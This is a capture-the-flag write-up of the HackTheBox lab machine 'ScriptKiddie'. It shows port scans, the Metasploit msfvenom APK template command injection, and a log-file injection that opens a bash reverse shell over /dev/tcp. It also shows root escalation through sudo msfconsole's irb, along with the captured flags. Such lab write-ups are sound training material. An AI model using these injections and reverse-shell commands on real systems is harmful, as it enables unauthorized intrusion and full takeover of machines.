ScriptKiddie IP:10.10.10.226


rustscan:
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack
5000/tcp open  upnp    syn-ack


nmap:
PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 3c:65:6b:c2:df:b9:9d:62:74:27:a7:b8:a9:d3:25:2c (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC/YB1g/YHwZNvTzj8lysM+SzX6dZzRbfF24y3ywkhai4pViGEwUklIPkEvuLSGH97NJ4y8r9uUXzyoq3iuVJ/vGXiFlPCrg+QDp7UnwANBmDqbVLucKdor+JkWHJJ1h3ftpEHgol54tj+6J7ftmaOR29Iwg+FKtcyNG6PY434cfA0Pwshw6kKgFa+HWljNl+41H3WVua4QItPmrh+CrSoaA5kCe0FAP3c2uHcv2JyDjgCQxmN1GoLtlAsEznHlHI1wycNZGcHDnqxEmovPTN4qisOKEbYfy2mu1Eqq3Phv8UfybV8c60wUqGtClj3YOO1apDZKEe8eZZqy5eXU8mIO+uXcp5zxJ/Wrgng7WTguXGzQJiBHSFq52fHFvIYSuJOYEusLWkGhiyvITYLWZgnNL+qAVxZtP80ZTq+lm4cJHJZKl0OYsmqO0LjlMOMTPFyA+W2IOgAmnM+miSmSZ6n6pnSA+LE2Pj01egIhHw5+duAYxUHYOnKLVak1WWk/C68=
|   256 b9:a1:78:5d:3c:1b:25:e0:3c:ef:67:8d:71:d3:a3:ec (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJA31QhiIbYQMUwn/n3+qcrLiiJpYIia8HdgtwkI8JkCDm2n+j6dB3u5I17IOPXE7n5iPiW9tPF3Nb0aXmVJmlo=
|   256 8b:cf:41:82:c6:ac:ef:91:80:37:7c:c9:45:11:e8:43 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOWjCdxetuUPIPnEGrowvR7qRAR7nuhUbfFraZFmbIr4
5000/tcp open  http    syn-ack Werkzeug httpd 0.16.1 (Python 3.8.5)
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-title: k1d'5 h4ck3r t00l5
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


searchsploit Werkzeug                    
----------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                   |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Pallets Werkzeug 0.15.4 - Path Traversal                                                                                                                         | python/webapps/50101.py
Werkzeug - 'Debug Shell' Command Execution                                                                                                                       | multiple/remote/43905.py
Werkzeug - Debug Shell Command Execution (Metasploit)                                                                                                            | python/remote/37814.rb
----------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results


found an exploit on msfconsole but it doesnt work

geting backto the site on port 5000, we  notice that there is a seciton that involves payloads. On a simple google search(msfvenom apk template) we find: https://www.exploit-db.com/exploits/49491


creating the payload

msf6 > search apk template

Matching Modules
================

   #  Name                                                                    Disclosure Date  Rank       Check  Description
   -  ----                                                                    ---------------  ----       -----  -----------
   0  exploit/unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection  2020-10-29       excellent  No     Rapid7 Metasploit Framework msfvenom APK Template Command Injection


Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection

msf6 > use 0
[*] No payload configured, defaulting to cmd/unix/python/meterpreter/reverse_tcp
msf6 exploit(unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection) >

msf6 exploit(unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection) > set payload cmd/unix/reverse_netcat
payload => cmd/unix/reverse_netcat
msf6 exploit(unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection) > run

[+] msf.apk stored at /home/kali/.msf4/local/msf.apk
msf6 exploit(unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection) > show options

Module options (exploit/unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   FILENAME  msf.apk          yes       The APK file name


Payload options (cmd/unix/reverse_netcat):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.10.14.10      yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port

   **DisablePayloadHandler: True   (no handler will be created!)**


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf6 exploit(unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection) > 


after setting android, a lhost:127.0.0.1 selecting the payload and click on generate we catch a reverse shell

kid@scriptkiddie:~$ cat user.txt
cat user.txt
6bf89f44f6d82a21f7c23a02b7cf948b


kid@scriptkiddie:/home$ cd pwn
cd pwn
kid@scriptkiddie:/home/pwn$ ls
ls
recon  scanlosers.sh
kid@scriptkiddie:/home/pwn$ cat scanloser.sh
cat scanloser.sh
cat: scanloser.sh: No such file or directory
kid@scriptkiddie:/home/pwn$ cat scanlosers.sh
cat scanlosers.sh
#!/bin/bash

log=/home/kid/logs/hackers

cd /home/pwn/
cat $log | cut -d' ' -f3- | sort -u | while read ip; do
    sh -c "nmap --top-ports 10 -oN recon/${ip}.nmap ${ip} 2>&1 >/dev/null" &
done

if [[ $(wc -l < $log) -gt 0 ]]; then echo -n > $log; fi
kid@scriptkiddie:/home/pwn$ 


Assuming the scanlosers.sh script to be responsible for emptying the log file, we open a netcat listener
and write a reverse shell payload to /home/kid/logs/hackers :

staart a nc connection nc -lvnp 7777

modify the log file:

kid@scriptkiddie:/home/pwn$ echo 'a b $(bash -c "bash -i &>/dev/tcp/10.10.14.10/7777 0>&1")' > /home/kid/logs/hackers
<p/10.10.14.10/7777 0>&1")' > /home/kid/logs/hackers



┌──(kali㉿kali)-[~/Practice/HackTheBox/ScriptKiddie]
└─$ nc -lnvp 7777
listening on [any] 7777 ...
connect to [10.10.14.10] from (UNKNOWN) [10.10.10.226] 48932
bash: cannot set terminal process group (841): Inappropriate ioctl for device
bash: no job control in this shell
pwn@scriptkiddie:~$ 


PRIVESC:

pwn@scriptkiddie:~$ sudo -l
sudo -l
Matching Defaults entries for pwn on scriptkiddie:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User pwn may run the following commands on scriptkiddie:
    (root) NOPASSWD: /opt/metasploit-framework-6.0.9/msfconsole




    https://gtfobins.github.io/gtfobins/msfconsole/#sudo

    Sudo
If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

sudo msfconsole
msf6 > irb
>> system("/bin/sh")



msf6 > irb
stty: 'standard input': Inappropriate ioctl for device
[*] Starting IRB shell...
[*] You are in the "framework" object

system("/bin/bash")
Switch to inspect mode.
irb: warn: can't alias jobs from irb_jobs.
>> system("/bin/bash")
id
uid=0(root) gid=0(root) groups=0(root)
python3 -c 'import pty;pty.spawn("/bin/bash")'
root@scriptkiddie:/home/pwn# cd /root
cd /root
root@scriptkiddie:~# cat root.txt
cat root.txt
26722dfbefaafdd9b1d8afa9abf77f2e
root@scriptkiddie:~# 
